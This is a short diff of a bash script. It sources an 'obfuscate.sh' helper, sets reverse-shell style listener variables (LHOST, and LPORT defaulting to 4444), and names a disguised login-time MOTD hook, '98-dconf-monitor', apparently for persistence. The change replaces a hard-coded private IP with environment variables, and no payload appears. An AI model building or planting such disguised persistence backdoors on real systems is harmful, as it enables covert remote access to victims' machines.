@@ -5,8 +5,8 @@ set -euo pipefail
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "${SCRIPT_DIR}/obfuscate.sh"
 
-LHOST="192.168.75.130"
-LPORT="4444"
+LHOST="${LHOST:-}"
+LPORT="${LPORT:-4444}"
 
 MOTD_SCRIPT="/etc/update-motd.d/98-dconf-monitor"
 
